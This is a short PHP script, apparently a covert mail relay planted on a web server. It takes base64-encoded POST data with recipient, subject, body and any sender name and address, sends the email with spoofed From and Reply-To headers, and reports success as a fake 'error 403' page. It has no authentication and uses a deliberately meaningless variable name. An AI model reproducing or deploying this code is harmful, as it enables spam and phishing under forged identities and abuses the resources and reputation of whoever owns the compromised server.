<?php



function mailto($to, $subject, $message, $from, $fromAddr) {


$mb_internal_encoding = mb_internal_encoding();
mb_internal_encoding('UTF-8');
$headers = "Date: ".date("r")."\r\n";
//$headers.= "Return-Path: <".$fromAddr.">\r\n";
$headers.= "From: =?UTF-8?B?".base64_encode($from)."?= <".$fromAddr.">\r\n";
$headers.= "Reply-To:  =?UTF-8?B?".base64_encode($from)."?= <".$fromAddr.">\r\n";



$headers.= "MIME-Version: 1.0\r\n";


$subject = "=?UTF-8?B?".base64_encode($subject)."?=";


if (strpos($message, '<html')) {
$msgType = "text/html";
} else $msgType = "text/plain";
$body = $message;
mb_internal_encoding($mb_internal_encoding);
return mail($to, $subject, $body, $headers);
}








foreach($_POST as $key => $x_value) {

$data = base64_decode($x_value) ;
$to_data = explode('|',  $data);

$to = $to_data[0];
$x_subject = $to_data[1];
$x_body = $to_data[2];
$from_user = $to_data[3];
$from_email = $to_data[4];



$jfnbrsjfq =  mailto($to, $x_subject, $x_body, $from_user, $from_email);
if($jfnbrsjfq){echo 'error 403';} else {echo 'error 404 : ' . $jfnbrsjfq;} 

}



